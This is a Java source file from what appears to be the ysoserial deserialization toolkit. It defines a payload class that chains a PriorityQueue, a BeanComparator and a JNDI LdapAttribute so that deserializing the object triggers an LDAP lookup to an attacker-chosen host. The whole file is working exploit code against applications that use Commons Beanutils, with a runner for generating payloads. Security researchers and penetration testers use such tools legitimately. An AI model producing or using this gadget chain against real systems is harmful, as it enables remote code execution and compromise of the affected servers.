package ysoserial.payloads;

import org.apache.commons.beanutils.BeanComparator;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.naming.CompositeName;
import java.math.BigInteger;
import java.util.PriorityQueue;

@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
@Authors({ Authors.FROHOFF })
public class CommonsBeanutils1LdapAttribute implements ObjectPayload<Object> {


    public Object getObject(final String command) throws Exception {

        String ldapURL = command.substring(0, command.lastIndexOf("/")) ;
        String objectName = command.substring(command.lastIndexOf("/")+1);

        Object ldapAttribute = Reflections.newInstance("com.sun.jndi.ldap.LdapAttribute", "id");
        Reflections.setFieldValue(ldapAttribute, "baseCtxURL", ldapURL);
        Reflections.setFieldValue(ldapAttribute, "rdn", new CompositeName(objectName + "//b"));


		// mock method name until armed
		final BeanComparator comparator = new BeanComparator("lowestSetBit");

		// create queue with numbers and basic comparator
		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
		// stub data for replacement later
		queue.add(new BigInteger("1"));
		queue.add(new BigInteger("1"));

		// switch method called by comparator
		Reflections.setFieldValue(comparator, "property", "attributeDefinition");

		// switch contents of queue
		final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
		queueArray[0] = ldapAttribute;
		queueArray[1] = ldapAttribute;

		return queue;
	}

	public static void main(final String[] args) throws Exception {

        PayloadRunner.run(CommonsBeanutils1LdapAttribute.class, args);
	}


}
